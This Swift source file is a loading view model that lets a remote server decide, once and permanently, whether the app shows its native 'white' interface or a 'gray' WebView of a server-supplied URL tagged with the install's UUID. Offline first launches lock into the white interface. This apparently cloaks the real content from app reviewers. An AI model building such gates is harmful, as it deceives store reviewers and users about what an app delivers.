//
//  LoadingFlowViewModel.swift
//  Zorbulsexvor Loxbren
//
//  Created by Nguyen Minhthinh on 12.03.2026.
//

import Combine
import Foundation
import SwiftUI

@MainActor
final class LoadingFlowViewModel: ObservableObject {
    private static let tag = "[AppGate]"

    enum Phase: Equatable {
        case loading
        case white
        case gray(URL)
        case grayAwaitingNetwork
    }

    @Published private(set) var phase: Phase = .loading
    @Published var showNetworkSettingsAlert = false

    private var started = false

    func onAppear() {
        guard !started else { return }
        started = true
        Task { await run() }
    }

    func retryWhenNetworkMayBeAvailable() async {
        guard case .grayAwaitingNetwork = phase else { return }
        guard let s = RemoteGateDecisionStore.savedWebURLString, let base = URL(string: s) else { return }
        guard await NetworkReachability.isReachableNow() else { return }
        let uuid = InstallationIdentifierStore.shared.installationUUID()
        showNetworkSettingsAlert = false
        phase = .gray(URLAppendingUUID.augment(base: base, uuid: uuid))
    }

    private func run() async {
        let uuid = InstallationIdentifierStore.shared.installationUUID()
        OneSignalBootstrap.loginExternalUserIfConfigured(externalId: uuid)

        if RemoteGateDecisionStore.hasDecided {
            if RemoteGateDecisionStore.isWhiteRoute {
                print("\(Self.tag) white UI: already decided earlier (saved white route, no new server check)")
                phase = .white
                return
            }
            guard let s = RemoteGateDecisionStore.savedWebURLString, let base = URL(string: s) else {
                print("\(Self.tag) white UI: saved gray route but URL missing/invalid — falling back to white")
                RemoteGateDecisionStore.markWhite()
                phase = .white
                return
            }
            if await NetworkReachability.isReachableNow() {
                print("\(Self.tag) gray UI: restored saved URL (network OK)")
                phase = .gray(URLAppendingUUID.augment(base: base, uuid: uuid))
            } else {
                print("\(Self.tag) awaiting network: gray route saved, offline")
                phase = .grayAwaitingNetwork
                showNetworkSettingsAlert = true
            }
            return
        }

        if await NetworkReachability.isReachableNow() == false {
            print("\(Self.tag) white UI: first launch, no network path — saved white (server not called)")
            RemoteGateDecisionStore.markWhite()
            phase = .white
            return
        }

        phase = .loading
        print("\(Self.tag) first decision: calling server…")
        switch await RemoteGateService.fetch() {
        case .gray(let link):
            print("\(Self.tag) gray UI: server returned valid header → WebView")
            RemoteGateDecisionStore.markGray(url: link)
            phase = .gray(URLAppendingUUID.augment(base: link, uuid: uuid))
        case .white:
            print("\(Self.tag) white UI: server path = white (see [RemoteGate] logs: JSON `url` / header Base64)")
            RemoteGateDecisionStore.markWhite()
            phase = .white
        }
    }
}
